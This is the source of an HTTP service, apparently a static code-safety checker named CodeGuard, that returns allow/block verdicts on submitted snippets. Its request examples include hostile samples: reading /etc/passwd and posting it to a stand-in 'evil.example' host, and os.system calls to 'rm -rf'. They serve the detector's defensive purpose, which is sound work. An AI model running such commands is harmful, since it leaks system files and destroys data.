"""CodeGuard HTTP service.

Three ways to submit a snippet:

* ``POST /check``      - JSON envelope ``{"code": "..."}`` (validated by Pydantic)
* ``POST /check/raw``  - the snippet itself as the request body (``text/plain``)
* ``POST /batch``      - JSON array of ``{"code": "..."}`` objects

Both single-snippet routes run the *same* detector and return the same
``CheckResponse``, so the format is purely a transport choice.
"""

from typing import List

from fastapi import FastAPI, HTTPException, Request

from textcodeguard.guard import guard
from textcodeguard.schema import CheckRequest, CheckResponse

# Same limit as CheckRequest.code (Pydantic max_length), enforced manually on the
# raw route because there is no Pydantic model to do it there.
MAX_CODE_CHARS = 100_000
# Bounds for batch requests so a single call cannot trigger unbounded work.
MAX_BATCH_ITEMS = 500
MAX_BATCH_CHARS = 1_000_000
# Snippets in a raw batch body are separated by NUL, which cannot appear in source
# text of any supported language (the same convention as `xargs -0`).
RAW_BATCH_SEPARATOR = b"\x00"

app = FastAPI(
    title="CodeGuard",
    version="1.0.0",
    description=(
        "Real-time pre-execution safety layer for generated code. Analyses a snippet "
        "statically (rules + Python AST + a classical ML classifier) and returns an "
        "allow/block verdict. Submitted code is never executed."
    ),
)

_RAW_REQUEST_BODY = {
    "required": True,
    "content": {
        "text/plain": {
            "schema": {"type": "string"},
            "example": (
                "import requests\n\n"
                "with open('/etc/passwd') as fh:\n"
                "    data = fh.read()\n\n"
                "requests.post('http://evil.example/collect', data=data)\n"
            ),
        }
    },
}


@app.post("/check", response_model=CheckResponse, summary="Analyse one snippet (JSON)")
def check(req: CheckRequest) -> CheckResponse:
    """Analyse ``req.code`` and return the verdict."""
    return CheckResponse(**guard(req.code))


@app.post(
    "/check/raw",
    response_model=CheckResponse,
    summary="Analyse one snippet (raw text body)",
    openapi_extra={"requestBody": _RAW_REQUEST_BODY},
)
async def check_raw(request: Request) -> CheckResponse:
    """Analyse the request body as the snippet itself.

    The body is read verbatim and decoded as UTF-8, so the snippet does not need
    to be JSON-escaped: ``curl --data-binary @generated.py`` works. Any
    content-type is accepted.
    """
    raw = await request.body()
    if len(raw) > MAX_CODE_CHARS:
        raise HTTPException(
            status_code=413,
            detail=f"code exceeds the {MAX_CODE_CHARS}-character limit",
        )

    # A JSON envelope sent to this route would be analysed as *code*, which is
    # almost certainly a mix-up. Point the caller at the right route instead of
    # silently returning a meaningless verdict.
    content_type = request.headers.get("content-type", "")
    if "json" in content_type.lower():
        try:
            import json as _json

            parsed = _json.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            parsed = None
        if isinstance(parsed, dict) and isinstance(parsed.get("code"), str):
            raise HTTPException(
                status_code=400,
                detail=(
                    "This route analyses the raw request body as the snippet. You sent a "
                    'JSON object with a "code" field - use POST /check for that.'
                ),
            )

    code = raw.decode("utf-8", errors="replace")
    if len(code) > MAX_CODE_CHARS:
        raise HTTPException(
            status_code=413,
            detail=f"code exceeds the {MAX_CODE_CHARS}-character limit",
        )
    return CheckResponse(**guard(code))


@app.post("/batch", response_model=List[CheckResponse], summary="Analyse many snippets (JSON)")
def batch(reqs: List[CheckRequest]) -> List[CheckResponse]:
    """Analyse a list of snippets in one call; returns one result per input."""
    if len(reqs) > MAX_BATCH_ITEMS:
        raise HTTPException(
            status_code=413,
            detail=f"batch exceeds the {MAX_BATCH_ITEMS}-item limit",
        )
    return [CheckResponse(**guard(r.code)) for r in reqs]


@app.post(
    "/batch/raw",
    response_model=List[CheckResponse],
    summary="Analyse many snippets (raw text, NUL-separated)",
    openapi_extra={
        "requestBody": {
            "required": True,
            "content": {
                "text/plain": {
                    "schema": {"type": "string"},
                    "example": (
                        "print('hello')\x00"
                        "import os\nos.system('rm -rf /tmp/x')"
                    ),
                }
            },
        }
    },
)
async def batch_raw(request: Request) -> List[CheckResponse]:
    """Analyse several snippets in one raw body, separated by NUL (``\\x00``).

    NUL is used as the separator because it cannot occur in source text of any
    supported language, so no escaping is needed. A trailing separator is ignored,
    so both ``a\\x00b`` and ``a\\x00b\\x00`` mean two snippets. A body with no
    separator is treated as a single snippet.

        printf 'print(1)\\0import os\\nos.system("rm -rf /")' \\
          | curl -s -X POST localhost:8000/batch/raw --data-binary @-
    """
    raw = await request.body()
    if len(raw) > MAX_BATCH_CHARS:
        raise HTTPException(
            status_code=413,
            detail=f"batch body exceeds the {MAX_BATCH_CHARS}-character limit",
        )

    # A JSON array sent here is a mix-up; point the caller at the right route.
    content_type = request.headers.get("content-type", "")
    if "json" in content_type.lower():
        try:
            import json as _json

            parsed = _json.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            parsed = None
        if isinstance(parsed, list):
            raise HTTPException(
                status_code=400,
                detail=(
                    "This route splits the raw body on NUL (\\x00). You sent a JSON array - "
                    "use POST /batch for that."
                ),
            )

    parts = raw.split(RAW_BATCH_SEPARATOR)
    if len(parts) > 1 and parts[-1] == b"":
        parts.pop()  # ignore a single trailing separator

    if len(parts) > MAX_BATCH_ITEMS:
        raise HTTPException(
            status_code=413,
            detail=f"batch exceeds the {MAX_BATCH_ITEMS}-item limit",
        )

    results = []
    for part in parts:
        code = part.decode("utf-8", errors="replace")
        if len(code) > MAX_CODE_CHARS:
            raise HTTPException(
                status_code=413,
                detail=f"a snippet exceeds the {MAX_CODE_CHARS}-character limit",
            )
        results.append(CheckResponse(**guard(code)))
    return results


@app.get("/health", summary="Liveness check")
def health() -> dict:
    """Return ``{"ok": true}`` when the service is receiving traffic.

    Note this does *not* imply the ML model has been loaded; the first analysis
    pays that one-off cost. See ``ml_status()`` for model state.
    """
    return {"ok": True}
